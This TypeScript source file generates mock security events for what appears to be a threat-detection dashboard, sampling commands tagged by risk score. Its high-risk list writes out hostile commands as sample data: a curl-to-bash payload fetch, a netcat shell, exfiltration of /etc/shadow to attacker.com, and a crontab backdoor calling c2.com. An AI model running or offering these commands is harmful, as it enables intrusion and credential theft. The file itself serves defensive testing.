import { EVENT_CONFIG, RISK_DISTRIBUTION } from "./config";

export interface Event {
  id?: string;
  time?: string;
  line?: string;
  score?: number;
  alert?: boolean;
  reason?: string;
}

const HIGH_RISK_COMMANDS = [
  { line: "nmap -sS 192.168.1.0/24", score: 0.95, alert: true, reason: "Network scanning - SYN scan for reconnaissance" },
  { line: "chmod 777 /etc/passwd", score: 0.90, alert: true, reason: "Privilege escalation on critical system file" },
  { line: "curl http://malicious.com/payload.sh | bash", score: 0.92, alert: true, reason: "Remote code execution from untrusted source" },
  { line: "nc -l -p 4444 -e /bin/bash", score: 0.88, alert: true, reason: "Reverse shell using netcat" },
  { line: "base64 -d /etc/shadow | curl -X POST http://attacker.com", score: 0.94, alert: true, reason: "Data exfiltration of password hashes" },
  { line: "python3 -c 'import socket...'", score: 0.93, alert: true, reason: "Python reverse shell connection" },
  { line: "echo '*/*1***root*curl*http://c2.com' >> /etc/crontab", score: 0.91, alert: true, reason: "Backdoor via cron job modification" },
  { line: "iptables -F && iptables -P INPUT ACCEPT", score: 0.87, alert: true, reason: "Disabling firewall rules" },
  { line: "docker run --privileged --pid=host", score: 0.85, alert: true, reason: "Container escape with privileged access" },
  { line: "kubectl exec -it pod -- /bin/bash", score: 0.82, alert: true, reason: "Direct pod shell access - potential lateral movement" },
];

const MEDIUM_RISK_COMMANDS = [
  { line: "ps aux | grep -i password", score: 0.55, alert: false, reason: "Searching for passwords in running processes" },
  { line: "find / -name '*.pem' -o -name '*.key'", score: 0.58, alert: false, reason: "Searching for private keys across filesystem" },
  { line: "tcpdump -i eth0 -w capture.pcap", score: 0.52, alert: false, reason: "Network traffic capture - potential eavesdropping" },
  { line: "cat /etc/passwd /etc/group", score: 0.48, alert: false, reason: "Reading user and group information" },
  { line: "docker run --network=host alpine", score: 0.50, alert: false, reason: "Container using host network - reduced isolation" },
  { line: "kubectl get secrets -A", score: 0.56, alert: false, reason: "Accessing all secrets across namespaces" },
  { line: "ssh-keygen -t rsa && cat ~/.ssh/id_rsa.pub", score: 0.45, alert: false, reason: "SSH key generation and exposure" },
  { line: "netstat -tulpn | grep LISTEN", score: 0.42, alert: false, reason: "Scanning for listening ports and services" },
  { line: "curl -s https://ipinfo.io/ip", score: 0.47, alert: false, reason: "External IP lookup - potential reconnaissance" },
  { line: "kubectl port-forward svc/admin 8080:80", score: 0.53, alert: false, reason: "Port forwarding to admin service" },
];

const LOW_RISK_COMMANDS = [
  { line: "kubectl get pods", score: 0.11, alert: false, reason: "Listing pods - standard operation" },
  { line: "kubectl get nodes", score: 0.09, alert: false, reason: "Listing nodes - normal monitoring" },
  { line: "kubectl logs pod-name", score: 0.12, alert: false, reason: "Reading pod logs - standard debugging" },
  { line: "docker ps", score: 0.08, alert: false, reason: "Listing containers - standard operation" },
  { line: "kubectl describe service", score: 0.10, alert: false, reason: "Inspecting service details" },
  { line: "kubectl get deployments", score: 0.07, alert: false, reason: "Listing deployments - normal operation" },
  { line: "cat /proc/cpuinfo", score: 0.05, alert: false, reason: "Reading CPU info - system monitoring" },
  { line: "df -h", score: 0.04, alert: false, reason: "Checking disk usage - standard maintenance" },
  { line: "kubectl version", score: 0.03, alert: false, reason: "Checking Kubernetes version" },
  { line: "kubectl top pods", score: 0.06, alert: false, reason: "Monitoring pod resource usage" },
];

let mockEvents: Event[] = [];

const generateId = () => Math.random().toString(36).substring(2, 15);

const getRandomCommand = () => {
  const rand = Math.random();
  if (rand < RISK_DISTRIBUTION.HIGH) {
    const cmd = HIGH_RISK_COMMANDS[Math.floor(Math.random() * HIGH_RISK_COMMANDS.length)];
    return { ...cmd };
  } else if (rand < RISK_DISTRIBUTION.MEDIUM) {
    const cmd = MEDIUM_RISK_COMMANDS[Math.floor(Math.random() * MEDIUM_RISK_COMMANDS.length)];
    return { ...cmd };
  } else {
    const cmd = LOW_RISK_COMMANDS[Math.floor(Math.random() * LOW_RISK_COMMANDS.length)];
    return { ...cmd };
  }
};

export const generateMockEvent = (): Event => {
  const cmd = getRandomCommand();
  return {
    id: generateId(),
    time: new Date().toISOString(),
    ...cmd,
  };
};

export const initializeMockData = () => {
  mockEvents = Array.from({ length: EVENT_CONFIG.INITIAL_EVENTS_COUNT }, () => generateMockEvent());
};

export const addNewMockEvent = () => {
  const newEvent = generateMockEvent();
  mockEvents.unshift(newEvent);
  if (mockEvents.length > EVENT_CONFIG.MAX_EVENTS) {
    mockEvents.pop();
  }
};

export const generateBulkTestData = (count: number) => {
  for (let i = 0; i < count; i++) {
    addNewMockEvent();
  }
};

export const getMockEvents = (): Event[] => mockEvents;
